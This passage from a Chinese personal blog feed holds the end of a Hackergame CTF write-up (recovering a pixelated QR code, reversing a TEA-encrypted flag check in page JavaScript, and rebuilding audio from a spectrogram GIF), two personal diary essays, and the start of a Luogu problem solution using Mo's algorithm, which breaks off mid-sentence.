class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="comment"># import scipy</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">SIZE = <span class="number">627</span></span><br><span class="line">MSBLOCK = <span class="number">23</span></span><br><span class="line">QRBLOCK = <span class="number">11</span></span><br><span class="line">X, Y = <span class="number">103</span>, <span class="number">137</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ImageToMatrix</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="comment"># 读取图片</span></span><br><span class="line">    im = Image.<span class="built_in">open</span>(filename)</span><br><span class="line">    <span class="comment"># 显示图片</span></span><br><span class="line"><span class="comment">#     im.show()  </span></span><br><span class="line">    width,height = im.size</span><br><span class="line">    im = im.convert(<span class="string">&quot;L&quot;</span>) </span><br><span class="line">    data = im.getdata()</span><br><span class="line">    data = np.matrix(data,dtype=<span class="string">&#x27;float&#x27;</span>)/<span class="number">255.0</span></span><br><span class="line">    new_data = np.reshape(data,(width,height))</span><br><span class="line">    <span class="keyword">return</span> new_data</span><br><span class="line"><span class="comment">#     new_im = Image.fromarray(new_data)</span></span><br><span class="line"><span class="comment">#     # 显示图片</span></span><br><span class="line"><span class="comment">#     new_im.show()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MatrixToImage</span>(<span class="params">data</span>):</span><br><span class="line">    data = data*<span class="number">255</span></span><br><span class="line">    new_im = Image.fromarray(data.astype(np.uint8))</span><br><span class="line">    <span class="keyword">return</span> new_im</span><br><span class="line">    </span><br><span class="line">pre_arr =  [[<span class="number">0</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(SIZE)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(SIZE)]</span><br><span class="line">res_arr =  [[<span class="number">1</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(SIZE//QRBLOCK)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(SIZE//QRBLOCK)]</span><br><span class="line">kimeta =  [[<span class="number">0</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(SIZE//QRBLOCK)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(SIZE//QRBLOCK)]<span class="comment">#钦定了</span></span><br><span class="line">EACH = <span class="built_in">int</span>(math.ceil(MSBLOCK/QRBLOCK)) <span class="comment">#EACH=3</span></span><br><span class="line">filename = <span class="string">&#x27;pixelated_qrcode.bmp&#x27;</span></span><br><span class="line">data = ImageToMatrix(filename)</span><br><span class="line">np.set_printoptions(threshold=<span class="number">1145141919810</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,SIZE):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,SIZE):</span><br><span class="line">            pre_arr[i][j]=data[i].tolist()[<span class="number">0</span>][j]</span><br><span class="line">            <span class="keyword">if</span> i%QRBLOCK==<span class="number">0</span> <span class="keyword">and</span> j%QRBLOCK==<span class="number">0</span>:</span><br><span class="line">                res_arr[i//QRBLOCK][j//QRBLOCK]=<span class="built_in">int</span>(data.tolist()[i][j])</span><br><span class="line"><span class="comment"># print(pre_arr)</span></span><br><span class="line"><span class="keyword">def</span>  <span class="title function_">check</span>(<span class="params">i,j,now</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;=<span class="number">9</span> <span class="keyword">or</span> i&gt;=<span class="number">51</span> <span class="keyword">or</span> j&lt;=<span class="number">12</span> <span class="keyword">or</span> j&gt;=<span class="number">54</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (pre_arr[i*QRBLOCK+<span class="number">3</span>][j*QRBLOCK+<span class="number">3</span>] == now):<span class="comment">#随便写的offset</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> (kimeta[i][j] <span class="keyword">or</span> vis[i][j]) <span class="keyword">and</span> res_arr[i][j]!=now:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getRange</span>(<span class="params">i,j</span>):</span><br><span class="line">    <span class="keyword">return</span> i*QRBLOCK,j*QRBLOCK,(i+<span class="number">1</span>)*QRBLOCK-<span class="number">1</span>,(j+<span class="number">1</span>)*QRBLOCK-<span class="number">1</span> <span class="comment">#x1,y1,x2,y2</span></span><br><span class="line"></span><br><span class="line">vis =  [[<span class="number">0</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(SIZE//QRBLOCK)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(SIZE//QRBLOCK)]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calcDelta</span>(<span class="params">Mi,Mj,fillN,comp,LUR,LUC</span>):</span><br><span class="line">    fn = fillN</span><br><span class="line">    <span class="keyword">for</span> xx <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">        <span class="keyword">for</span> yy <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(xx,yy,fn&amp;<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="number">114514</span></span><br><span class="line">            fn = fn&gt;&gt;<span class="number">1</span></span><br><span class="line">    avr = <span class="number">0</span></span><br><span class="line">    qx1,qy1,qx2,qy2 = X+Mi*MSBLOCK,Y+Mj*MSBLOCK,X+(Mi+<span class="number">1</span>)*MSBLOCK-<span class="number">1</span>,Y+(Mj+<span class="number">1</span>)*MSBLOCK-<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">            <span class="keyword">if</span> (fillN&amp;<span class="number">1</span>):</span><br><span class="line">                x1,y1,x2,y2 = getRange(x,y)</span><br><span class="line">                inx1,iny1,inx2,iny2 = <span class="built_in">max</span>(x1,qx1),<span class="built_in">max</span>(y1,qy1),<span class="built_in">min</span>(x2,qx2),<span class="built_in">min</span>(y2,qy2)</span><br><span class="line">                avr = avr + (iny2-iny1+<span class="number">1</span>)*(inx2-inx1+<span class="number">1</span>)</span><br><span class="line">            fillN = fillN &gt;&gt; <span class="number">1</span></span><br><span class="line">    newres = avr/(MSBLOCK*MSBLOCK)</span><br><span class="line">    <span class="keyword">if</span> (newres &lt; comp-<span class="number">0.1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1919810</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(math.floor((avr/(MSBLOCK*MSBLOCK))*<span class="number">255</span>)/<span class="number">255</span>-comp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">putRec</span>(<span class="params">i,j</span>):<span class="comment">#放置识别码块</span></span><br><span class="line">    kimeta[i][j]=<span class="number">1</span></span><br><span class="line">    res_arr[i][j]=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    kimeta[i][j+<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    res_arr[i][j+<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    kimeta[i][j-<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    res_arr[i][j-<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    kimeta[i+<span class="number">1</span>][j]=<span class="number">1</span></span><br><span class="line">    res_arr[i+<span class="number">1</span>][j]=<span class="number">1</span></span><br><span class="line">    kimeta[i-<span class="number">1</span>][j]=<span class="number">1</span></span><br><span class="line">    res_arr[i-<span class="number">1</span>][j]=<span class="number">1</span></span><br><span class="line">    kimeta[i+<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    res_arr[i+<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    kimeta[i-<span class="number">1</span>][j-<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    res_arr[i-<span class="number">1</span>][j-<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    kimeta[i+<span class="number">1</span>][j-<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    res_arr[i+<span class="number">1</span>][j-<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    kimeta[i-<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    res_arr[i-<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(i-<span class="number">2</span>,i+<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(j-<span class="number">2</span>,j+<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(x-i)==<span class="number">2</span> <span class="keyword">or</span> <span class="built_in">abs</span>(y-j)==<span class="number">2</span>:</span><br><span class="line">                kimeta[x][y]=<span class="number">1</span></span><br><span class="line">                res_arr[x][y]=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">putRec(<span class="number">28</span>,<span class="number">28</span>)</span><br><span class="line">putRec(<span class="number">28</span>,<span class="number">50</span>)</span><br><span class="line">putRec(<span class="number">50</span>,<span class="number">50</span>)</span><br><span class="line">putRec(<span class="number">50</span>,<span class="number">28</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>,<span class="number">52</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>,<span class="number">55</span>):</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">9</span> <span class="keyword">or</span> i==<span class="number">51</span> <span class="keyword">or</span> j==<span class="number">12</span> <span class="keyword">or</span> j==<span class="number">54</span>:</span><br><span class="line">            kimeta[i][j]=<span class="number">1</span></span><br><span class="line">            res_arr[i][j]=pre_arr[i*QRBLOCK+<span class="number">3</span>][j*QRBLOCK+<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">new_arr =  [[<span class="number">1</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(SIZE)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(SIZE)]</span><br><span class="line">fked =  [[<span class="number">0</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line"></span><br><span class="line">cntt = <span class="number">0</span></span><br><span class="line">savecnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">i,j</span>):<span class="comment">#从马赛克块的i行j列开始</span></span><br><span class="line">    <span class="keyword">global</span> cntt,savecnt</span><br><span class="line">    cntt = cntt+<span class="number">1</span></span><br><span class="line">    LUR , LUC= (X+i*MSBLOCK)//QRBLOCK , (Y+j*MSBLOCK)//QRBLOCK</span><br><span class="line">    <span class="comment">#落在哪个二维码方块上</span></span><br><span class="line">    <span class="keyword">if</span> (cntt==<span class="number">200000</span>):<span class="comment">#保存中途结果</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,SIZE):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,SIZE):</span><br><span class="line">                    new_arr[i][j]=res_arr[i//QRBLOCK][j//QRBLOCK]</span><br><span class="line">        MatrixToImage(np.array(new_arr)).save(<span class="string">&#x27;mid%s.bmp&#x27;</span>%savecnt)</span><br><span class="line">        savecnt = savecnt + <span class="number">1</span></span><br><span class="line">        cntt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="number">0</span> <span class="keyword">or</span> i&gt;=<span class="number">20</span> <span class="keyword">or</span> j&lt;<span class="number">0</span> <span class="keyword">or</span> j&gt;=<span class="number">20</span> <span class="keyword">or</span> fked[i][j]:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    fked[i][j]=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    nowMin , nowSol = <span class="number">114514191981.0</span> , (<span class="number">1</span>&lt;&lt;(EACH*EACH))-<span class="number">1</span></span><br><span class="line">    tmpp =  [[<span class="number">0</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">            tmpp[x-LUR][y-LUC]=vis[x][y]</span><br><span class="line">    <span class="keyword">for</span> filN <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1</span>&lt;&lt;(EACH*EACH)):<span class="comment">#枚举每个马赛克块影响到的3*3=9个QR块</span></span><br><span class="line">        tmp = calcDelta(i, j, filN, pre_arr[X+i*MSBLOCK+<span class="number">2</span>][Y+j*MSBLOCK+<span class="number">2</span>],LUR,LUC)<span class="comment">#同样是乱写的offset+2</span></span><br><span class="line">        <span class="keyword">if</span> tmp &lt; <span class="number">0.00000001</span>:</span><br><span class="line">            nowSol = filN</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">                <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">                    vis[x][y] = <span class="number">1</span></span><br><span class="line">                    res_arr[x][y]=nowSol&amp;<span class="number">1</span></span><br><span class="line">                    nowSol = nowSol&gt;&gt;<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> ((i+<span class="number">1</span>&lt;<span class="number">20</span> <span class="keyword">and</span> (<span class="keyword">not</span> fked[i+<span class="number">1</span>][j]) <span class="keyword">and</span> dfs(i+<span class="number">1</span>,j)) <span class="keyword">or</span> (j+<span class="number">1</span>&lt;<span class="number">20</span> <span class="keyword">and</span> (<span class="keyword">not</span> fked[i][j+<span class="number">1</span>]) <span class="keyword">and</span> dfs(i,j+<span class="number">1</span>)) <span class="keyword">or</span> (i-<span class="number">1</span>&gt;=<span class="number">0</span> <span class="keyword">and</span> (<span class="keyword">not</span> fked[i-<span class="number">1</span>][j]) <span class="keyword">and</span> dfs(i-<span class="number">1</span>,j)) <span class="keyword">or</span> (j-<span class="number">1</span>&gt;=<span class="number">0</span> <span class="keyword">and</span> (<span class="keyword">not</span> fked[i][j-<span class="number">1</span>]) <span class="keyword">and</span> dfs(i,j-<span class="number">1</span>))):</span><br><span class="line">                fked[i][j]=<span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">                    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">                        vis[x][y] = tmpp[x-LUR][y-LUC]</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            </span><br><span class="line">    fked[i][j]=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">            vis[x][y] = tmpp[x-LUR][y-LUC]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">#预先扫描，把能确定的、没有多解的先填上</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        LUR , LUC= (X+i*MSBLOCK)//QRBLOCK , (Y+j*MSBLOCK)//QRBLOCK</span><br><span class="line">        succnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> filN <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1</span>&lt;&lt;(EACH*EACH)):</span><br><span class="line">                tmp = calcDelta(i, j, filN, pre_arr[X+i*MSBLOCK+<span class="number">2</span>][Y+j*MSBLOCK+<span class="number">2</span>],LUR,LUC)</span><br><span class="line">                <span class="keyword">if</span> tmp &lt; <span class="number">0.00000001</span>:</span><br><span class="line">                    succnt = succnt + <span class="number">1</span></span><br><span class="line">                    nowSol = filN</span><br><span class="line">        <span class="keyword">if</span> succnt == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">                <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">                    kimeta[x][y] = <span class="number">1</span></span><br><span class="line">                    res_arr[x][y]=nowSol&amp;<span class="number">1</span></span><br><span class="line">                    nowSol = nowSol&gt;&gt;<span class="number">1</span></span><br><span class="line">dfs(<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,SIZE):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,SIZE):</span><br><span class="line">        new_arr[i][j]=res_arr[i//QRBLOCK][j//QRBLOCK]</span><br><span class="line">MatrixToImage(np.array(new_arr)).save(<span class="string">&#x27;resu.bmp&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最终效果：<img src="https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030160204036-1937509495.jpg" alt="QRCode"></p><hr><h2 id="minecRaft"><a href="#minecRaft" class="headerlink" title="minecRaft"></a>minecRaft</h2><p>web× reverse√<br>打开网页查看js，找到flag.js，在<a href="http://jsnice.org/">jsnice.org</a>反混淆后自己手动再替换下几个迷人眼的常量，之后进行代码审计，会发现这是个TEA加密。如何发现是TEA呢？我搜了好久，后来有人告诉我只需要搜常量就行（还需要学习一个人生经验）。<br>我们需要找到一个字符串s，使得s.encrypt(“{那串数字密钥}”)&#x3D;&#x3D;&#x3D; “6f……0c”<br>把密文切片避免转换后数字过大，在题目页面下<code>F12</code>，进入Console里执行：</p><pre><code class="javascript">window.btoa(LongToStr4(Base16ToLong(&#39;6fbde674&#39;))+LongToStr4(Base16ToLong(&#39;819a59bf&#39;))+LongToStr4(Base16ToLong(&#39;a1209256&#39;))+LongToStr4(Base16ToLong(&#39;5b4ca2a7&#39;))+LongToStr4(Base16ToLong(&#39;a11dc670&#39;))+LongToStr4(Base16ToLong(&#39;c678681d&#39;))+LongToStr4(Base16ToLong(&#39;af4afb67&#39;))+LongToStr4(Base16ToLong(&#39;04b82f0c&#39;)))</code></pre><p>得到密文dOa9b79ZmoFWkiChp6JMW3DGHaEdaHjGZ&#x2F;tKrwwvuAQ&#x3D;<br>谷歌<code>TEA decryption online</code>，进入<a href="https://www.mefancy.com/obfuscation/encryption-generator.php">https://www.mefancy.com/obfuscation/encryption-generator.php</a>把上面那串数字密钥（13…）还有密文丢进去就出flag了。</p><hr><h2 id="p😭q"><a href="#p😭q" class="headerlink" title="p😭q"></a>p😭q</h2><p>老外大奥流泪.gif  早知道，还是原道.jpg<br>先把gif的帧提取出来方便处理：</p><pre><code class="python">import osimport sysfrom PIL import Imagedef extractFrames(inGif, outFolder):    frame = Image.open(inGif)    nframes = 0    while frame:        frame.save(&#39;./dest/%s.png&#39; % (nframes))        nframes += 1        try:            frame.seek(nframes)        except EOFError:            break;    return Trueif __name__ == &#39;__main__&#39;:    image = os.path.abspath(sys.argv[1])    dest = os.path.join(os.path.dirname(image), &quot;dest&quot;)    if not os.path.exists(dest):        os.mkdir(dest)    extractFrames(image, dest)</code></pre><p>然后原题给啥库就用啥库，逆回去：</p><pre><code class="python">from array2gif import write_gif  # version: 1.0.4import librosa  # version: 0.8.1import numpy as np  # version: 1.19.5import soundfile as sffrom PIL import Imageimport matplotlib.pyplot as pltdef ImageToMatrix(filename):    im = Image.open(filename)    height,width = im.size    im = im.convert(&#39;L&#39;)    data = im.getdata()    data = np.matrix(data,dtype=&#39;float&#39;)/255.0    new_data = np.reshape(data,(width,height))    return new_datanp.set_printoptions(threshold=1145141919810)num_freqs = 32quantize = 2min_db = -60max_db = 30fft_window_size = 2048frame_step_size = 512window_function_type = &#39;hann&#39;red_pixel = [255, 0, 0]white_pixel = [255, 255, 255]sample_rate = 22050lis =  [[0.0 for col in range(587)] for row in range(32)]imgg = [[0.0 for col in range(130)] for row in range(92)]for ii in range (0,587):    filename = &#39;./dest/%s.png&#39;%ii    print(filename)    data = ImageToMatrix(filename)    for i in range(0,92):        for j in range(0,130):            imgg[i][j]=data.tolist()[i][j]    for xpos in range(0,32):        for scan in range(0,92):            if imgg[scan][xpos*4+2]&lt;1.0:                  lis[xpos][ii]=float((91-scan)-60)                breakspectrogram =  np.array(lis)audio_signal = librosa.feature.inverse.mel_to_audio(librosa.db_to_power(spectrogram), sr=sample_rate, n_fft=fft_window_size*2, hop_length=frame_step_size, window=window_function_type)sf.write(&#39;newnew.wav&#39;, audio_signal, sample_rate) </code></pre><p>最后在Adobe Audition CC里随便处理处理，勉强能听了，开始努力听写：<br><code>Theflagis f,l,a,g ......</code>  </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write-Up </tag>
            
            <tag> Hackergame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我胡汉三又回来了！</title>
      <link href="/2021/06/24/%E6%88%91%E8%83%A1%E6%B1%89%E4%B8%89%E5%8F%88%E5%9B%9E%E6%9D%A5%E4%BA%86%EF%BC%81/"/>
      <url>/2021/06/24/%E6%88%91%E8%83%A1%E6%B1%89%E4%B8%89%E5%8F%88%E5%9B%9E%E6%9D%A5%E4%BA%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>高考结束忽然想起这玩意。成绩没出前赶紧写写证明我还活着。当然远古时期的中二透顶又矫揉造作的文章还是得留着，毕竟人还是需要中二一点。古人卧薪尝胆，我没那能力也没文采，只能以中二之文章警醒自我实现中二之事业。<br>希望可以成为像冈部伦太郎那样的人！<br>可是他也是现充。自闭了。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>随笔2020.1.17</title>
      <link href="/2020/01/17/%E9%9A%8F%E7%AC%942020.1.17/"/>
      <url>/2020/01/17/%E9%9A%8F%E7%AC%942020.1.17/</url>
      
        <content type="html"><![CDATA[<p>期末考成绩出了。尘埃落定，然后炸了。不过我没啥心情波动，除了化学成绩出来的时候抹了把眼泪其他没啥了，毕竟考了两次班倒一也太可悲了。<br>不过被学得挺好可能有一两科发挥失常的人好好得膜上了几发，还是蛮不爽的哈哈。<br>算是意料之中，毕竟自己之前学习态度就不怎么样，凭什么比好好努力的同学要考的好？<br>或许是因为最近老是熬夜，我实在是太困了，在公交车上睡着了。猛然抬头发现车子正使出公交车站，我忙上前询问司机：“能开开门让我下车吗？”<br>我得到了否定的回答，这也是应该的。抬头看了看司机工牌上的五个大红星，又想到是司机四平八稳的驾驶风格让我收获了一段意外的精致睡眠，我还有点感激？<br>在车站等了好久不见等的车来。车终于来了却根本没有停靠。我这才发现，公交公司又改线路了，遂招来出租车，破点小费。<br>报出目的地，上车，司机马上跟我攀谈起来。不知道是不是因为精致睡眠的缘故，我因为感冒而嘶哑无比的嗓子突然好了不少。总之司机主动和我谈起个人情况，我也应付性的回回，当然我警戒心突然就很强，没忘打开录音。<br>他问起我的学校，我的学习，我的考试，我也配合地抖了个精光。反正我个人、信息都没啥价值，也没法用来不当得利。<br>他聊起了新高考，聊起了他在清华的侄子——因为在他询问我段排的时候我顺从着虚荣心的伟大领导报了个略靠前的名次，于是他就把我当成了未来thu才子，将来pku学者。<br>虽然我刚刚在教室听完群友（指tp大的学长）的宣讲，我知道我跟他们差了多少。<br>抵达目的地，下车，结账。我想了想，觉得录音没啥意义，我略带惭愧地删了，录进去的对话再放送一定会很乐。<br>我在家回望过去的一年，惊喜地发现我实际上啥都没干。虽然可能后半段学的认真了一些，但本质上还是一个混子。过去的一年像是被分块地丢进了记忆深处，所以我现在关于2019年的第一印象根本就是空白。和我一样虚荣，我的记忆总是报喜不报忧的，所以可想而知去年过的也很差，“也”。<br>不过再怎么说寒假终于来了，虽然对春节不是很感兴趣，周围也没什么过年的气氛，天气也变得寒冷，网购的口罩也迟迟不到货，寒假只有三周，但是学长老师家长同学们的乐观开朗或是鼓励打气之类的正面情绪还是让我觉得很快乐。再说，只有冬天，尤其是南方这种借着寒潮狐假虎威的没有实际杀伤力的冬天，才是体会温暖被窝的宝贵价值的最好辅助。<br>总之我会很开心地过一个或充实或摸鱼，学不学看危机感（指明年就要高考）的一般寒假。我想一般般地好好学点什么，让自己兼顾摸鱼的快乐和“学习”的虚假满足感。<br>停止瞎奶，还是好好学学吧？你又不是傻子。<br>唔。毕竟退役以后，文化课看起来也不是那么面目可憎？<br>想吃烤肉。想听好歌。想睡好觉。想看好番。<br>从未来的个人价值中揩点油，变为快乐洒在我和周围人的寒假里，乐意至极。<br>此文章因为我腹中空空没有文采显得凌乱无比又枯燥，见笑了。<br>新年快乐。<br>以及，cy学长好帅。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P5072 [Ynoi2015]盼君勿忘</title>
      <link href="/2019/10/08/%E6%B4%9B%E8%B0%B7P5072%20%5BYnoi2015%5D%E7%9B%BC%E5%90%9B%E5%8B%BF%E5%BF%98/"/>
      <url>/2019/10/08/%E6%B4%9B%E8%B0%B7P5072%20%5BYnoi2015%5D%E7%9B%BC%E5%90%9B%E5%8B%BF%E5%BF%98/</url>
      
        <content type="html"><![CDATA[<p>原题地址:<a href="https://www.luogu.org/problem/P5072">https://www.luogu.org/problem/P5072</a>  </p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>给定一个序列，每次查询一个区间[l,r]中所有子序列分别去重后的和mod p</p><hr><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>我们考虑每个数的贡献。即该区间内含有这个数的子序列个数。用补集转化为不含这个数的子序列个数。<br>那么，假设这个数在[l,r]内出现了k次，则一共有2^(r-l+1) -2^(r-l+1-k)个子序列包含这个数。<br>本题可以离线，因此选择使用莫队，过程中维护cnt[k]表示区间内恰好出现k次的数字个数，维护sum[j]表示区间内恰好出现j次的数字之和（区间内出现次数相同的数，对于这些数，区间中包含这些数的子序列个数都相同，因此存数字之和就行）。<br>然而这样时间复杂度为O(询问次数*单次询问复杂度)&#x3D;O(n*max(sqrt(n),n))&#x3D;O(nm)，并不可行。我们发现时间瓶颈不在莫队的sqrt(n)，而是在单次查询中求解的复杂度n。<br>有2个套路可供使用：出现次数大于sqrt(n)的数不超过sqrt(n)个，值不为0的cnt[k]少于2*sqrt(n)个（反证易得，本质类似）。 </p><ul><li>对于第一个套路，我们分类讨论：出现次数小于等于sqrt(n)，则统计每个出现次数的数字之和；大于sqrt(n)的用哈希表(unordered_set,C++11)存下具体的数字和其出现次数。这样每次查询是sqrt(n)。  </li><li>笔者使用的则是第二个套路：val[x]表示出现次数恰好为x的数字之和（同上文的sum[j]）。随着莫队l,r指针的移动，把所有可能变为非0的val[x]记下来，指针移动完毕后再对其进行筛选，把确实非0的val[x]保留，其他去除。这样计算单次答案的复杂度就等同于单次查询中莫队指针移动的平均步数：都是sqrt(n)级别。这样做不需要用到哈希表之类的，常数小了很多，甚至不需要读入优化也能轻松过。</li></ul><p>还没完。我们发现模数是不定的，为了保证单次查询的复杂度压在sqrt(n)以内，我们还有最后一件事情要做：在sqrt(n)的时间内求出2^(r-l+1) 